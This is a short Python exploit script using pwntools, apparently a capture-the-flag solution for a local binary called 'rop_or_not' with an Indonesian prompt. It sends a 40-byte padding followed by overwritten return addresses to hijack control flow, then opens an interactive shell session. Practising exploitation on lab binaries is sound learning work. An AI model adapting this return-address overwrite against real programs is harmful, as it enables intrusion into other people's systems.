#!/usr/bin/python
from pwn import *

r = process('./rop_or_not')

p = 'a' * 40
p += p32(0x80483b0)
p += 'aaaa'
p += p32(0x08048660)

r.recvuntil('Kamu siapa? \n ')
r.sendline(p)

r.interactive()
